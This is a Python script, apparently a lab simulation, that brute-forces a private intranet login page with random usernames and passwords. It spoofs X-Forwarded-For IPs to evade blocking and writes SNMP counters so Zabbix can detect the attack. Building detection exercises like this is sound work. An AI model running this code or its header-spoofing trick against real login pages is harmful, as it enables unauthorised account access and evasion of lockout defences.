import asyncio
import httpx
import random
import os
import time
import sys
import signal
import socket

TARGET_URL = os.getenv("TARGET_URL", "https://10.10.100.4/login")
LOGIN_TYPE = os.getenv("LOGIN_TYPE", "student")
CONCURRENCY = int(os.getenv("CONCURRENCY", "10"))
SNMPREC_PATH = os.getenv("SNMPREC_PATH", "/data/security_monitor.snmprec")

# Tempo máximo de execução por clique (em segundos). Evita processos fantasmas.
MAX_DURATION = int(os.getenv("MAX_DURATION", "300")) 

usernames = ["admin", "root", "professor", "aluno", "joao", "maria", "pedro", "test", "user", "guest"]

total_failures = 0
failure_timestamps = []
active_ips = {}
is_attacking = 1

# Sistema de trava (Lock) para impedir múltiplos ataques e acúmulo de CPU
try:
    lock_socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    lock_socket.bind('\0bruteforce_lock')
except socket.error:
    print("[!] Um ataque já está em execução. Esta chamada foi cancelada para poupar CPU.", flush=True)
    sys.exit(0)

def reset_snmp_status():
    """Grava o status 'Inativo' no SNMP para o Zabbix fechar a trigger."""
    global total_failures
    snmprec_content = f"""1.3.6.1.2.1.1.5.0|4|Monitoramento de Seguranca Intranet
1.3.6.1.4.1.99999.1.1.0|66|{total_failures}
1.3.6.1.4.1.99999.1.2.0|66|0
1.3.6.1.4.1.99999.1.3.0|66|0
1.3.6.1.4.1.99999.1.4.0|66|0
"""
    try:
        with open(SNMPREC_PATH, "w") as f:
            f.write(snmprec_content)
        print("\n[SNMP] Status zerado. O Zabbix identificará o fim do ataque.", flush=True)
    except Exception:
        pass

def handle_shutdown(sig, frame):
    print("\n[!] Sinal de parada recebido do sistema. Encerrando...", flush=True)
    reset_snmp_status()
    sys.exit(0)

# Intercepta comandos de parada enviados pelo painel web ou Docker
signal.signal(signal.SIGINT, handle_shutdown)
signal.signal(signal.SIGTERM, handle_shutdown)

async def attack_worker(worker_id):
    global total_failures, failure_timestamps, active_ips
    
    start_time = time.time()
    
    async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
        while True:
            # Condição de parada: Se passou do tempo limite, o laço quebra e a CPU é liberada
            if time.time() - start_time > MAX_DURATION:
                break

            ip = f"{random.randint(11,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            user = random.choice(usernames)
            password = f"senha_{random.randint(100, 9999)}"
            
            headers = {"X-Forwarded-For": ip}
            data = {"username": user, "password": password, "login_type": LOGIN_TYPE}
            
            try:
                resp = await client.post(TARGET_URL, data=data, headers=headers, follow_redirects=False)
                now = time.time()
                active_ips[ip] = now
                
                if resp.status_code == 302:
                    loc = resp.headers.get("location", "")
                    if "error=blocked" not in loc:
                        total_failures += 1
                        failure_timestamps.append(now)
                else:
                    total_failures += 1
                    failure_timestamps.append(now)
            except Exception:
                pass
            
            await asyncio.sleep(0.1)

async def update_snmprec():
    global total_failures, failure_timestamps, active_ips, is_attacking
    
    while True:
        now = time.time()
        failure_timestamps = [t for t in failure_timestamps if now - t <= 3600]
        active_ips = {ip: t for ip, t in active_ips.items() if now - t <= 300}
        
        snmprec_content = f"""1.3.6.1.2.1.1.5.0|4|Monitoramento de Seguranca Intranet
1.3.6.1.4.1.99999.1.1.0|66|{total_failures}
1.3.6.1.4.1.99999.1.2.0|66|{len(failure_timestamps)}
1.3.6.1.4.1.99999.1.3.0|66|{len(active_ips)}
1.3.6.1.4.1.99999.1.4.0|66|{is_attacking}
"""
        try:
            with open(SNMPREC_PATH, "w") as f:
                f.write(snmprec_content)
        except Exception:
            pass
            
        await asyncio.sleep(5)

async def main():
    print(f"--- Iniciando Simulação de Brute Force ---", flush=True)
    print(f"Duração programada: {MAX_DURATION} segundos", flush=True)
    
    update_task = asyncio.create_task(update_snmprec())
    tasks = [attack_worker(i) for i in range(CONCURRENCY)]
    
    # Aguarda o fim do tempo limite estabelecido no MAX_DURATION
    await asyncio.gather(*tasks)
    
    update_task.cancel()
    reset_snmp_status()
    print("--- Simulação Finalizada. Processos encerrados e CPU liberada. ---", flush=True)

if __name__ == "__main__":
    asyncio.run(main())